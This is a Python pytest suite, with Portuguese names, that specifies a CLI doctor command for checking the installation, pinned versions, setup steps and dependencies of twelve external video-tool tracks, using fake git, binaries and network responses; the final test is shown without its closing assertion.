"""Contract of `simplicio-video doctor trilhas [--json] [--online]` and of its row `trilhas` in `doctor all`.

The twelve external tracks of tools.TOOLS, in the registry order. For each one: installed, the pin in use (the registry pin,
the lock's or SIMPLICIO_<NAME>_REF), its own setup (venv, node_modules, build, config.toml, .env.local, scripts) and the system
dependencies (git, bun, node, npx, npm, ffmpeg, docker), each gap with the exact command that fixes it.

Status per track, like the doctor's other checks: `warn` for a track that is not installed, a gap, a pin in use that differs, a
required dependency that is missing; `fail` only for a broken install (a folder that is not a checkout, a corrupt .git, a pinned file
that changed, a venv without its program). Docker and the optional dependencies never warn. `--online` asks upstream (the same
resolution as `update --check`): git ls-remote, npm view, PyPI. video-use is pin-only and never asks upstream.

Offline by construction: the checkouts are real git repositories under tmp_path (git is the only real program), the binaries are
fakes on the sealed PATH, the upstream is answered by a fake, and nothing is written.
"""
from __future__ import annotations

import dataclasses
import hashlib
import json
import os
import shutil
import subprocess
from pathlib import Path

import pytest

import _caixa
from _caixa import _Lazy, write_fake_tool, write_git_launcher
from _comum import executa, instantanea
from simplicio_video import matchcut, mcp_server, tools, tools_lock, tools_update
from simplicio_video.cli import main

# the new module is looked up on use, so a missing module fails each TEST (red for the right reason)
dt = _Lazy("simplicio_video.doctor_trilhas")

# fixtures: assigned (not imported) so pytest finds them and ruff sees no shadowing by the test parameters
saude = _caixa.saude
caixa = _caixa.caixa

TRILHAS = list(tools.TOOLS)  # the registry order: the twelve tracks
SCHEMA = "simplicio.doctor-trilhas/v1"
YTDLP_FETCH = "instala na primeira vez que você usar `simplicio-video media fetch` (exige uma URL e --autorizo)"


def _clone_voicestudio() -> str:
    """No `voicestudio clone` exists: the fix is the git commands that tools.install runs, at the pinned commit."""
    t = tools.get("voicestudio")
    destino = tools.checkout_dir(t)
    return f"git clone --filter=blob:none {t.source} {destino} && git -C {destino} checkout --detach {tools.pinned_ref(t)}"


FIX_DE_INSTALAR = {
    "openmontage": "simplicio-video montage clone",
    "opencut": "simplicio-video opencut clone",
    "hypit": "npm install -g @hypit/hypit@0.2.17",
    "toonflow": "simplicio-video toonflow clone",
    "moneyprinter": "simplicio-video moneyprinter clone",
    "matchcut": "simplicio-video matchcut clone",
    "instagram": "simplicio-video instagram clone",
    "rea_video": "simplicio-video rea-video clone",
    "video-use": "simplicio-video edit setup",
    "tinyfish": "npm install -g @tiny-fish/cli@0.50.1",
    "yt-dlp": YTDLP_FETCH,
}


# --- helpers: track lookup and the checks of a track ----------------------------------------------------------------


def _trilha(doc: dict, nome: str) -> dict:
    achadas = [t for t in doc["tracks"] if t["name"] == nome]
    assert len(achadas) == 1, f"expected one track {nome!r}: {[t['name'] for t in doc['tracks']]}"
    return achadas[0]


def _c(track: dict, nome: str) -> dict:
    achadas = [c for c in track["checks"] if c["name"] == nome]
    assert len(achadas) == 1, f"{track['name']}: expected one check {nome!r}: {[c['name'] for c in track['checks']]}"
    return achadas[0]


def _pendencias(doc: dict) -> dict:
    """What is not ok, per track: the message of a failing assertion says where the gap is."""
    return {t["name"]: [(c["name"], c["status"], c["summary"]) for c in t["checks"] if c["status"] != "ok"]
            for t in doc["tracks"] if t["status"] != "ok"}


# --- helpers: fake checkouts, venvs and binaries ---------------------------------------------------------------------


def _grava(caminho: Path, arquivos: dict) -> None:
    for rel, texto in arquivos.items():
        alvo = caminho / rel
        alvo.parent.mkdir(parents=True, exist_ok=True)
        alvo.write_text(texto, encoding="utf-8")


def _falso_git(*args, cwd=None):
    """tools._git without git (the suite is hermetic): `rev-parse HEAD` answers the commit written in <checkout>/.fake-head;
    `--show-toplevel` answers <checkout>/.fake-toplevel (default: the folder itself); `cat-file` fails when the folder has
    .fake-sem-objeto. A folder without .fake-head is not a repository."""
    pasta = Path(cwd) if cwd is not None else None
    if pasta is not None and (pasta / ".fake-head").is_file():
        if args[:2] == ("rev-parse", "HEAD"):
            return (pasta / ".fake-head").read_text(encoding="utf-8").strip()
        if args[:2] == ("rev-parse", "--show-toplevel"):
            alvo = pasta / ".fake-toplevel"
            return alvo.read_text(encoding="utf-8").strip() if alvo.is_file() else str(pasta)
        if args[:1] == ("cat-file",):
            if (pasta / ".fake-sem-objeto").is_file():
                raise tools.ToolError("cat-file: objeto ausente (falso)")
            return ""
    raise tools.ToolError(f"git {' '.join(args[:2])}: não é um repositório (falso)")


def _repo(caminho: Path, arquivos: dict) -> str:
    """A checkout made of `arquivos`: its commit is the pin the test gives the track (an invented one, unique per folder)."""
    caminho.mkdir(parents=True, exist_ok=True)
    _grava(caminho, arquivos)
    (caminho / ".git").mkdir(exist_ok=True)
    sha = hashlib.sha1(f"{caminho}\n{sorted(arquivos.items())}".encode("utf-8")).hexdigest()
    (caminho / ".fake-head").write_text(sha + "\n", encoding="utf-8")
    return sha


def _commit(caminho: Path, rel: str, texto: str) -> str:
    """A new commit in the checkout: the file is written and HEAD moves to a new invented commit."""
    _grava(caminho, {rel: texto})
    antigo = (caminho / ".fake-head").read_text(encoding="utf-8")
    sha = hashlib.sha1(f"{antigo}{rel}\n{texto}".encode("utf-8")).hexdigest()
    (caminho / ".fake-head").write_text(sha + "\n", encoding="utf-8")
    return sha


def _fixa(monkeypatch, nome: str, ref: str) -> None:
    """The registry pin of a track is `ref` for this test (tools.get reads TOOLS, so every reader sees it)."""
    monkeypatch.setitem(tools.TOOLS, nome, dataclasses.replace(tools.TOOLS[nome], ref=ref))


def _bin(venv: Path, nome: str) -> Path:
    """A program of a venv where pip and `venv` put it on this system (bin/ or Scripts\\)."""
    pasta = "Scripts" if os.name == "nt" else "bin"
    return venv / pasta / (nome + (".exe" if os.name == "nt" else ""))


def _venv(venv: Path, *programas: str) -> None:
    for nome in ("python", *programas):
        alvo = _bin(venv, nome)
        alvo.parent.mkdir(parents=True, exist_ok=True)
        alvo.write_text("#!/bin/sh\n", encoding="utf-8")


def _dist_info(venv: Path, nome: str, versao: str) -> None:
    """What pip leaves in the venv of a pip track: the dist-info of its version (read by the doctor, no process starts)."""
    site = venv / "Lib" / "site-packages" if os.name == "nt" else venv / "lib" / "python3.12" / "site-packages"
    info = site / f"{nome}-{versao}.dist-info"
    info.mkdir(parents=True, exist_ok=True)
    (info / "METADATA").write_text(f"Metadata-Version: 2.1\nName: {nome}\nVersion: {versao}\n", encoding="utf-8")


def _sha(conteudo: dict) -> dict:
    return {rel: hashlib.sha256(texto.encode("utf-8")).hexdigest() for rel, texto in conteudo.items()}


@pytest.fixture
def ambiente(saude, monkeypatch):
    """The sealed PATH of the `saude` machine (node 22.11, ffmpeg with libass, the workspace) plus what the tracks look for:
    git (a program on the PATH whose commands are answered by _falso_git), bun, npx and npm. The checkouts go to <tmp>/tools
    (SIMPLICIO_TOOLS_DIR) and video-use to <tmp>/video-use (VIDEO_USE_DIR). Nothing is installed yet: a machine with no track."""
    e = saude.caixa
    monkeypatch.setenv("SIMPLICIO_TOOLS_DIR", str(e.tmp / "tools"))
    monkeypatch.setenv("VIDEO_USE_DIR", str(e.tmp / "video-use"))
    monkeypatch.setattr(tools, "_git", _falso_git)
    write_fake_tool(e.bin, "git", "")
    write_fake_tool(e.bin, "bun", "1.2.0\n")
    write_fake_tool(e.bin, "npx", "")
    write_fake_tool(e.bin, "npm", "")
    return saude


def monta_saudavel(saude, monkeypatch) -> Path:
    """Every track installed at its pin, its setup done, its binaries on the sealed PATH. Node 24 (tinyfish needs it; hypit
    runs through npx at Node 22.15 or newer). Returns the tools folder."""
    e = saude.caixa
    tools_dir = e.tmp / "tools"
    write_fake_tool(e.bin, "node", "v24.1.0\n")
    write_fake_tool(e.bin, "tinyfish", "tinyfish 0.50.1\n")

    _fixa(monkeypatch, "openmontage", _repo(tools_dir / "openmontage", {"backlot/__init__.py": "# falso\n"}))
    _venv(e.data / "openmontage-data" / "venv")

    d = tools_dir / "opencut"
    _fixa(monkeypatch, "opencut", _repo(d, {"package.json": "{}\n", "apps/web/.env.example": "X=1\n"}))
    (d / "node_modules").mkdir()
    _grava(d, {"apps/web/.env.local": "X=1\n"})

    d = tools_dir / "toonflow"
    _fixa(monkeypatch, "toonflow", _repo(d, {"package.json": "{}\n"}))
    (d / "node_modules").mkdir()
    _grava(d, {"build/server/index.js": "", "build/mcp/stdio.js": ""})

    d = tools_dir / "moneyprinter"
    _fixa(monkeypatch, "moneyprinter", _repo(d, {"config.example.toml": "[app]\n"}))
    _grava(d, {"config.toml": "[app]\n"})
    _venv(e.data / "moneyprinter-data" / "venv")

    d = tools_dir / "matchcut"
    conteudo = {rel: f"falso {rel}\n" for rel in matchcut.PINNED_SHA256}
    _fixa(monkeypatch, "matchcut", _repo(d, {"SKILL.md": "# falso\n", **conteudo}))
    monkeypatch.setattr(matchcut, "PINNED_SHA256", _sha(conteudo))
    _venv(e.data / "matchcut-data" / "venv")

    _fixa(monkeypatch, "instagram", _repo(tools_dir / "instagram", {"skills/ig-reel/hookscore.py": "# falso\n"}))

    _fixa(monkeypatch, "rea_video", _repo(tools_dir / "rea_video", {"rea_video/cli.py": "# falso\n"}))
    _venv(e.data / "rea-video-data" / "venv", "rea-video")

    _fixa(monkeypatch, "voicestudio", _repo(tools_dir / "voicestudio", {"package.json": "{}\n"}))

    _fixa(monkeypatch, "video-use", _repo(e.tmp / "video-use", {"helpers/render.py": "# falso\n"}))
    tts = e.tmp / "tts" / "python"
    tts.parent.mkdir(parents=True, exist_ok=True)
    tts.write_text("", encoding="utf-8")
    monkeypatch.setenv("SIMPLICIO_TTS_PY", str(tts))

    _venv(tools_dir / "yt-dlp" / "venv", "yt-dlp")
    _dist_info(tools_dir / "yt-dlp" / "venv", "yt_dlp", "2026.10.26")
    return tools_dir


class Rede:
    """The upstream, answered by fakes: `git ls-remote` gives the commit of `heads[url]`, `npm view` the version of `npm[pacote]`,
    PyPI the document `pypi`. Every command asked is recorded: a track that must not be asked is then easy to see."""

    def __init__(self, heads=None, npm=None, pypi=None):
        self.heads = heads or {}
        self.npm = npm or {}
        self.pypi = pypi or {}
        self.chamadas: list = []
        self.explode: dict = {}  # url -> exception the fake raises for that ls-remote

    def run(self, argv, cwd=None):
        self.chamadas.append(list(argv))
        if argv[:2] == ["git", "ls-remote"] and argv[-2] in self.explode:
            raise self.explode[argv[-2]]
        if argv[:2] == ["git", "ls-remote"]:
            sha = self.heads.get(argv[-2])
            if sha is None:
                return subprocess.CompletedProcess(argv, 128, "", "fatal: repositório indisponível")
            return subprocess.CompletedProcess(argv, 0, f"ref: refs/heads/main\tHEAD\n{sha}\tHEAD\n", "")
        if len(argv) >= 4 and argv[1] == "view" and argv[3] == "version":
            versao = self.npm.get(argv[2])
            if versao is None:
                return subprocess.CompletedProcess(argv, 1, "", "E404")
            return subprocess.CompletedProcess(argv, 0, versao + "\n", "")
        return subprocess.CompletedProcess(argv, 1, "", f"comando inesperado: {argv}")

    def io(self) -> tools_update.Io:
        return tools_update.Io(network=True, run=self.run, fetch_json=lambda url: self.pypi, now=lambda: 1700000000,
                               which=lambda nome: f"/falso/{nome}")

    def consultados(self) -> set:
        return {a[-2] for a in self.chamadas if a[:2] == ["git", "ls-remote"]}


# --- the contract ---------------------------------------------------------------------------------------------------


def test_o_schema_e_o_da_trilhas(ambiente):
    assert dt.SCHEMA == SCHEMA


def test_lista_as_doze_trilhas_do_registro_na_ordem_dele(ambiente):
    doc = dt.collect()
    assert doc["schema"] == SCHEMA and doc["online"] is False
    assert [t["name"] for t in doc["tracks"]] == TRILHAS and len(doc["tracks"]) == 12
    chaves = {"name", "command", "status", "summary", "installed", "version", "pin", "pin_source", "pin_registry", "pin_match",
              "upstream", "checks"}
    for track in doc["tracks"]:
        assert set(track) == chaves, track
        assert track["command"] == f"simplicio-video {tools.COMMANDS.get(track['name'], track['name'])}"


def test_cada_linha_tem_o_formato_do_doctor(ambiente):
    doc = dt.collect()
    for track in doc["tracks"]:
        for c in track["checks"]:
            assert set(c) == {"name", "status", "summary", "fix", "detail"}, c
            assert c["status"] in ("ok", "warn", "fail") and c["summary"]
            assert c["fix"] is None or isinstance(c["fix"], str)
            assert isinstance(c["detail"], dict)


def test_o_status_geral_e_o_pior_das_trilhas(ambiente, monkeypatch):
    monta_saudavel(ambiente, monkeypatch)
    (ambiente.caixa.tmp / "tools" / "moneyprinter" / "config.toml").unlink()  # a gap: warn
    doc = dt.collect()
    assert doc["status"] == "warn" and _trilha(doc, "moneyprinter")["status"] == "warn"
    (ambiente.caixa.tmp / "tools" / "opencut" / "package.json").unlink()  # a broken install: fail
    doc = dt.collect()
    assert doc["status"] == "fail" and _trilha(doc, "opencut")["status"] == "fail"


# --- nothing installed: every track warns with the exact command, nothing fails --------------------------------------


def test_sem_nenhuma_trilha_todas_avisam_e_nenhuma_falha(ambiente):
    doc = dt.collect()
    assert doc["status"] == "warn", _pendencias(doc)
    assert [t["status"] for t in doc["tracks"]] == ["warn"] * 12
    assert all(not t["installed"] for t in doc["tracks"])


@pytest.mark.parametrize("nome", TRILHAS)
def test_o_comando_para_instalar_cada_trilha(ambiente, nome):
    esperado = FIX_DE_INSTALAR.get(nome) or _clone_voicestudio()
    assert _c(_trilha(dt.collect(), nome), "instalada")["fix"] == esperado


def test_sem_trilha_instalada_o_pin_e_o_registro_e_nao_ha_linha_de_pin(ambiente):
    track = _trilha(dt.collect(), "openmontage")
    assert track["pin_match"] is None and track["pin_source"] == "pin"
    assert track["pin"] == tools.get("openmontage").ref == track["pin_registry"]
    assert not [c for c in track["checks"] if c["name"] == "pin"]


def test_sem_git_as_trilhas_de_checkout_avisam_com_a_dependencia(ambiente):
    for launcher in ambiente.caixa.bin.glob("git*"):
        launcher.unlink()
    doc = dt.collect()
    for nome in ("openmontage", "opencut", "toonflow", "moneyprinter", "matchcut", "instagram", "rea_video", "voicestudio",
                 "video-use"):
        assert _c(_trilha(doc, nome), "dep:git")["status"] == "warn", nome
    assert not [c for c in _trilha(doc, "yt-dlp")["checks"] if c["name"] == "dep:git"]


# --- healthy: every track ok ---------------------------------------------------------------------------------------


def test_ambiente_completo_fica_ok_em_todas_as_trilhas(ambiente, monkeypatch):
    monta_saudavel(ambiente, monkeypatch)
    doc = dt.collect()
    assert doc["status"] == "ok", _pendencias(doc)
    assert all(t["installed"] and t["status"] == "ok" for t in doc["tracks"])


def test_pin_em_uso_confere_com_o_commit_do_checkout(ambiente, monkeypatch):
    monta_saudavel(ambiente, monkeypatch)
    track = _trilha(dt.collect(), "opencut")
    assert track["pin_match"] is True and track["pin_source"] == "pin"
    assert track["version"] == track["pin"] and _c(track, "pin")["status"] == "ok"


def test_hypit_roda_por_npx_quando_o_node_e_22_15_ou_mais(ambiente, monkeypatch):
    monta_saudavel(ambiente, monkeypatch)
    track = _trilha(dt.collect(), "hypit")
    assert track["installed"] is True and _c(track, "instalada")["status"] == "ok"
    assert "npx" in _c(track, "instalada")["summary"].lower()
    assert _c(track, "dep:node")["status"] == "ok" and _c(track, "dep:npx")["status"] == "ok"


# --- the pin: registry, lock and override -----------------------------------------------------------------------------


def test_checkout_em_outro_commit_avisa_e_manda_refazer_o_clone(ambiente, monkeypatch):
    monta_saudavel(ambiente, monkeypatch)
    _commit(ambiente.caixa.tmp / "tools" / "openmontage", "novo.txt", "x\n")
    track = _trilha(dt.collect(), "openmontage")
    pin = _c(track, "pin")
    assert pin["status"] == "warn" and track["pin_match"] is False
    assert pin["fix"] == "simplicio-video montage clone"


def test_lock_que_segue_o_upstream_passa_a_ser_o_pin_em_uso(ambiente, monkeypatch):
    monta_saudavel(ambiente, monkeypatch)
    d = ambiente.caixa.tmp / "tools" / "opencut"
    registro = tools.get("opencut").ref
    novo = _commit(d, "novo.txt", "x\n")
    tools_lock.write_lock({"schema": tools_lock.SCHEMA, "updated_at": 1, "tools": {"opencut": {
        "kind": "git", "source": tools.get("opencut").source, "mode": "follow", "status": "ok", "ref": novo, "resolved_at": 1}}})
    track = _trilha(dt.collect(), "opencut")
    assert track["pin_source"] == "lock" and track["pin"] == novo and track["pin_registry"] == registro
    assert track["pin_match"] is True and _c(track, "pin")["status"] == "ok"


def test_override_do_pin_aparece_como_fonte_e_vale(ambiente, monkeypatch):
    monta_saudavel(ambiente, monkeypatch)
    head = (ambiente.caixa.tmp / "tools" / "opencut" / ".fake-head").read_text(encoding="utf-8").strip()
    monkeypatch.setenv("SIMPLICIO_OPENCUT_REF", head)
    track = _trilha(dt.collect(), "opencut")
    assert track["pin_source"] == "override" and track["pin_match"] is True


def test_pip_em_outra_versao_avisa_e_manda_refazer_o_venv(ambiente, monkeypatch):
    monta_saudavel(ambiente, monkeypatch)
    venv = ambiente.caixa.tmp / "tools" / "yt-dlp" / "venv"
    for info in venv.rglob("*.dist-info"):
        shutil.rmtree(info)
    _dist_info(venv, "yt_dlp", "2026.9.1")
    track = _trilha(dt.collect(), "yt-dlp")
    pin = _c(track, "pin")
    assert pin["status"] == "warn" and track["version"] == "2026.9.1" and track["pin_match"] is False
    assert "media fetch" in pin["fix"] and str(venv) in pin["fix"]


# --- broken installs fail; the rest warns ------------------------------------------------------------------------


def test_pasta_sem_o_marcador_e_instalacao_quebrada_e_falha(ambiente):
    pasta = ambiente.caixa.tmp / "tools" / "opencut"
    _grava(pasta, {"README.md": "sobra de um clone interrompido\n"})
    doc = dt.collect()
    c = _c(_trilha(doc, "opencut"), "instalada")
    assert c["status"] == "fail" and _trilha(doc, "opencut")["status"] == "fail"
    assert str(pasta) in c["fix"] and "opencut clone" in c["fix"]
    assert [t["name"] for t in doc["tracks"] if t["status"] == "fail"] == ["opencut"]


def test_checkout_com_git_corrompido_e_falha(ambiente):
    pasta = ambiente.caixa.tmp / "tools" / "toonflow"
    _grava(pasta, {"package.json": "{}\n"})
    (pasta / ".git").mkdir()
    (pasta / ".git" / "HEAD").write_text("lixo\n", encoding="utf-8")
    c = _c(_trilha(dt.collect(), "toonflow"), "instalada")
    assert c["status"] == "fail" and "toonflow clone" in c["fix"]


def test_binario_npm_que_nao_roda_e_instalacao_quebrada(ambiente):
    write_fake_tool(ambiente.caixa.bin, "tinyfish", "", rc=1)
    c = _c(_trilha(dt.collect(), "tinyfish"), "instalada")
    assert c["status"] == "fail" and c["fix"] == "npm install -g @tiny-fish/cli@0.50.1"


def test_venv_do_yt_dlp_sem_o_programa_e_falha(ambiente):
    venv = ambiente.caixa.tmp / "tools" / "yt-dlp" / "venv"
    _venv(venv)  # a python, and no yt-dlp: the pip install stopped halfway
    c = _c(_trilha(dt.collect(), "yt-dlp"), "instalada")
    assert c["status"] == "fail" and YTDLP_FETCH in c["fix"]


def test_venv_do_montage_sem_python_e_falha_e_manda_o_setup(ambiente, monkeypatch):
    monta_saudavel(ambiente, monkeypatch)
    venv = ambiente.caixa.tmp / "data" / "openmontage-data" / "venv"
    _bin(venv, "python").unlink()
    c = _c(_trilha(dt.collect(), "openmontage"), "setup:venv")
    assert c["status"] == "fail" and c["fix"] == "simplicio-video montage setup"


def test_venv_do_rea_video_sem_o_comando_e_falha_e_manda_o_setup(ambiente, monkeypatch):
    monta_saudavel(ambiente, monkeypatch)
    _bin(ambiente.caixa.tmp / "data" / "rea-video-data" / "venv", "rea-video").unlink()
    c = _c(_trilha(dt.collect(), "rea_video"), "setup:venv")
    assert c["status"] == "fail" and c["fix"] == "simplicio-video rea-video setup"


def test_arquivo_fixado_alterado_no_commit_do_pin_e_falha(ambiente, monkeypatch):
    """matchcut's pinned scripts are checked by sha256 at the commit in use; instagram is not (its module is not imported here)."""
    monta_saudavel(ambiente, monkeypatch)
    rel = "scripts/mix.py"
    alvo = ambiente.caixa.tmp / "tools" / "matchcut" / rel
    alvo.write_text("alterado por alguém\n", encoding="utf-8")
    c = _c(_trilha(dt.collect(), "matchcut"), "integridade")
    # the fix restores the file from the pinned commit: a second clone at the same commit would not undo the local edit
    assert c["status"] == "fail" and rel in c["summary"]
    assert c["fix"] == f"git -C {ambiente.caixa.tmp / 'tools' / 'matchcut'} checkout -- {rel}"


def test_arquivo_alterado_fora_do_commit_do_pin_nao_e_falha_de_integridade(ambiente, monkeypatch):
    """Another commit (a lock or an override) has other bytes: the pin row says it, the integrity row does not judge them."""
    monta_saudavel(ambiente, monkeypatch)
    d = ambiente.caixa.tmp / "tools" / "matchcut"
    _commit(d, "outro.txt", "x\n")
    (d / "scripts/mix.py").write_text("outro commit\n", encoding="utf-8")
    track = _trilha(dt.collect(), "matchcut")
    assert not [c for c in track["checks"] if c["name"] == "integridade" and c["status"] == "fail"]
    assert _c(track, "pin")["status"] == "warn"


def test_instagram_nao_tem_linha_de_integridade_aqui(ambiente, monkeypatch):
    """The sha256 of instagram's scripts is `simplicio-video instagram status`: this module does not import instagram."""
    monta_saudavel(ambiente, monkeypatch)
    assert not [c for c in _trilha(dt.collect(), "instagram")["checks"] if c["name"] == "integridade"]


# --- setup gaps: warn with the command that does it ----------------------------------------------------------------


def test_toonflow_sem_node_modules_e_sem_build_avisa_com_o_comando_exato(ambiente, monkeypatch):
    monta_saudavel(ambiente, monkeypatch)
    d = ambiente.caixa.tmp / "tools" / "toonflow"
    shutil.rmtree(d / "node_modules")
    shutil.rmtree(d / "build")
    track = _trilha(dt.collect(), "toonflow")
    assert track["status"] == "warn"
    assert _c(track, "setup:node_modules")["fix"] == f"cd {d} && bun install --frozen-lockfile"
    assert _c(track, "setup:build")["fix"] == f"cd {d} && bun run build:server"
    _grava(d, {"build/server/index.js": "", "build/mcp/stdio.js": ""})
    (d / "node_modules").mkdir()
    assert dt.collect()["status"] == "ok"


def test_opencut_sem_node_modules_e_com_env_local_vazio_avisa(ambiente, monkeypatch):
    monta_saudavel(ambiente, monkeypatch)
    d = ambiente.caixa.tmp / "tools" / "opencut"
    shutil.rmtree(d / "node_modules")
    (d / "apps/web/.env.local").write_text("", encoding="utf-8")
    track = _trilha(dt.collect(), "opencut")
    assert _c(track, "setup:node_modules")["fix"] == f"cd {d} && bun install"
    env = _c(track, "setup:.env.local")
    assert env["status"] == "warn" and "opencut dev" in env["fix"] and str(d / "apps" / "web" / ".env.local") in env["fix"]


def test_moneyprinter_sem_config_toml_manda_rodar_o_setup(ambiente, monkeypatch):
    monta_saudavel(ambiente, monkeypatch)
    (ambiente.caixa.tmp / "tools" / "moneyprinter" / "config.toml").unlink()
    assert _c(_trilha(dt.collect(), "moneyprinter"), "setup:config.toml")["fix"] == "simplicio-video moneyprinter setup"


def test_montage_e_matchcut_sem_venv_avisam_com_o_setup(ambiente, monkeypatch):
    monta_saudavel(ambiente, monkeypatch)
    shutil.rmtree(ambiente.caixa.tmp / "data" / "openmontage-data" / "venv")
    shutil.rmtree(ambiente.caixa.tmp / "data" / "matchcut-data" / "venv")
    doc = dt.collect()
    montage = _c(_trilha(doc, "openmontage"), "setup:venv")
    matchcut_venv = _c(_trilha(doc, "matchcut"), "setup:venv")
    assert (montage["status"], montage["fix"]) == ("warn", "simplicio-video montage setup")
    assert (matchcut_venv["status"], matchcut_venv["fix"]) == ("warn", "simplicio-video matchcut setup")


def test_rea_video_sem_venv_avisa_e_nao_falha(ambiente, monkeypatch):
    monta_saudavel(ambiente, monkeypatch)
    shutil.rmtree(ambiente.caixa.tmp / "data" / "rea-video-data" / "venv")
    c = _c(_trilha(dt.collect(), "rea_video"), "setup:venv")
    assert c["status"] == "warn" and c["fix"] == "simplicio-video rea-video setup"


def test_video_use_sem_o_python_de_apoio_avisa_com_a_variavel(ambiente, monkeypatch):
    monta_saudavel(ambiente, monkeypatch)
    monkeypatch.setenv("SIMPLICIO_TTS_PY", str(ambiente.caixa.tmp / "nao-existe" / "python"))
    c = _c(_trilha(dt.collect(), "video-use"), "dep:SIMPLICIO_TTS_PY")
    assert c["status"] == "warn" and "SIMPLICIO_TTS_PY" in c["fix"] and "simplicio-video edit setup" in c["fix"]


# --- system dependencies --------------------------------------------------------------------------------------------


@pytest.mark.parametrize("nome", ["openmontage", "moneyprinter", "matchcut", "rea_video", "video-use"])
def test_sem_ffmpeg_as_trilhas_que_renderizam_avisam(ambiente, nome):
    for launcher in ambiente.caixa.bin.glob("ffmpeg*"):
        launcher.unlink()
    c = _c(_trilha(dt.collect(), nome), "dep:ffmpeg")
    assert c["status"] == "warn" and c["fix"]


def test_yt_dlp_sem_ffmpeg_nao_avisa_porque_e_opcional(ambiente):
    for launcher in ambiente.caixa.bin.glob("ffmpeg*"):
        launcher.unlink()
    c = _c(_trilha(dt.collect(), "yt-dlp"), "dep:ffmpeg")
    assert c["status"] == "ok" and "opcional" in c["summary"]


def test_docker_e_opcional_e_nunca_avisa(ambiente, monkeypatch):
    monta_saudavel(ambiente, monkeypatch)
    doc = dt.collect()
    for nome in ("toonflow", "opencut"):
        c = _c(_trilha(doc, nome), "dep:docker")
        assert c["status"] == "ok" and "opcional" in c["summary"]
    assert doc["status"] == "ok"


def test_tinyfish_exige_node_24_e_hypit_22_15(ambiente):
    doc = dt.collect()  # node 22.11 on the machine
    fix = _c(_trilha(doc, "tinyfish"), "dep:node")
    assert fix["status"] == "warn" and "24" in fix["summary"] + (fix["fix"] or "")
    hypit = _c(_trilha(doc, "hypit"), "dep:node")
    assert hypit["status"] == "warn" and "22.15" in hypit["summary"] + (hypit["fix"] or "")


def test_bun_ausente_avisa_nas_trilhas_que_precisam_dele(ambiente):
    for launcher in ambiente.caixa.bin.glob("bun*"):
        launcher.unlink()
    doc = dt.collect()
    for nome in ("opencut", "toonflow"):
        c = _c(_trilha(doc, nome), "dep:bun")
        assert c["status"] == "warn" and c["fix"]
    assert _c(_trilha(doc, "voicestudio"), "dep:bun")["status"] == "ok"  # only to run from source: optional


# --- --online: upstream, the same resolution as `update --check` ----------------------------------------------------


def _rede_em_dia() -> Rede:
    heads = {}
    for t in tools.TOOLS.values():
        if t.kind == "git":
            heads[t.source] = tools.effective_ref(t)
    heads[tools.get("opencut").source] = "f" * 40  # upstream moved on: opencut is behind
    return Rede(heads=heads,
                npm={"@tiny-fish/cli": "0.50.1", "@hypit/hypit": "0.2.17"},
                pypi={"info": {"version": "2026.10.26"},
                      "urls": [{"packagetype": "bdist_wheel", "filename": "yt_dlp-2026.10.26-py3-none-any.whl",
                                "digests": {"sha256": "a" * 64}}]})


def test_offline_nunca_toca_na_rede(ambiente, monkeypatch):
    monta_saudavel(ambiente, monkeypatch)

    def proibido(*a, **k):
        raise AssertionError("o doctor trilhas sem --online não pode usar a rede")

    monkeypatch.setattr(tools_update, "live_io", proibido)
    monkeypatch.setattr(tools_update, "resolve", proibido)
    doc = dt.collect()
    assert doc["online"] is False and all(t["upstream"] is None for t in doc["tracks"])


def test_online_compara_cada_trilha_com_o_upstream(ambiente, monkeypatch):
    monta_saudavel(ambiente, monkeypatch)
    rede = _rede_em_dia()
    doc = dt.collect(online=True, io=rede.io())
    assert doc["online"] is True
    opencut = _trilha(doc, "opencut")
    assert opencut["upstream"]["latest"] == "f" * 40
    up = _c(opencut, "upstream")
    # `update` refuses in a checkout: the way to the upstream commit is the override of this install's pin
    assert up["status"] == "warn" and up["fix"] == f"SIMPLICIO_OPENCUT_REF={'f' * 40} simplicio-video opencut clone"
    assert _c(_trilha(doc, "openmontage"), "upstream")["status"] == "ok"
    assert _trilha(doc, "tinyfish")["upstream"]["latest"] == "0.50.1"
    assert _c(_trilha(doc, "tinyfish"), "upstream")["status"] == "ok"
    assert _c(_trilha(doc, "hypit"), "upstream")["status"] == "ok"
    assert _c(_trilha(doc, "yt-dlp"), "upstream")["status"] == "ok"


def test_upstream_mais_novo_no_npm_mostra_o_override_do_pin_e_no_pip_nao_mostra_comando(ambiente, monkeypatch):
    """An npm track moves through the override of its pin; a pip track's pin and sha256 live in tools.py, so there is no command."""
    monta_saudavel(ambiente, monkeypatch)
    rede = _rede_em_dia()
    rede.npm["@hypit/hypit"] = "0.3.1"
    rede.pypi = {"info": {"version": "2026.11.01"},
                 "urls": [{"packagetype": "bdist_wheel", "filename": "yt_dlp-2026.11.01-py3-none-any.whl",
                           "digests": {"sha256": "b" * 64}}]}
    doc = dt.collect(online=True, io=rede.io())
    assert _c(_trilha(doc, "hypit"), "upstream")["fix"] == "SIMPLICIO_HYPIT_REF=0.3.1 npm install -g @hypit/hypit@0.3.1"
    up = _c(_trilha(doc, "yt-dlp"), "upstream")
    assert up["status"] == "warn" and up["fix"] is None and "2026.11.01" in up["summary"]


def test_video_use_e_pin_only_e_nao_pergunta_ao_upstream(ambiente, monkeypatch):
    monta_saudavel(ambiente, monkeypatch)
    rede = _rede_em_dia()
    doc = dt.collect(online=True, io=rede.io())
    video_use = _trilha(doc, "video-use")
    assert video_use["upstream"]["pin_only"] is True
    assert _c(video_use, "upstream")["status"] == "ok" and "pin" in _c(video_use, "upstream")["summary"]
    assert tools.get("video-use").source not in rede.consultados()


def test_override_nao_e_seguido_pelo_online(ambiente, monkeypatch):
    monta_saudavel(ambiente, monkeypatch)
    monkeypatch.setenv("SIMPLICIO_OPENCUT_REF", "a" * 40)
    rede = _rede_em_dia()
    doc = dt.collect(online=True, io=rede.io())
    assert tools.get("opencut").source not in rede.consultados()
    assert _c(_trilha(doc, "opencut"), "upstream")["status"] == "ok"


def test_erro_de_rede_no_online_vira_aviso_da_trilha(ambiente, monkeypatch):
    monta_saudavel(ambiente, monkeypatch)
    rede = _rede_em_dia()
    rede.heads.pop(tools.get("toonflow").source)
    doc = dt.collect(online=True, io=rede.io())
    up = _c(_trilha(doc, "toonflow"), "upstream")
    assert up["status"] == "warn" and "não consegui consultar" in up["summary"]
    assert _trilha(doc, "toonflow")["status"] == "warn"


def test_online_nao_grava_nada(ambiente, monkeypatch):
    monta_saudavel(ambiente, monkeypatch)
    e = ambiente.caixa
    antes = (instantanea(e.home), instantanea(e.tmp / "tools"), instantanea(e.data))
    dt.collect(online=True, io=_rede_em_dia().io())
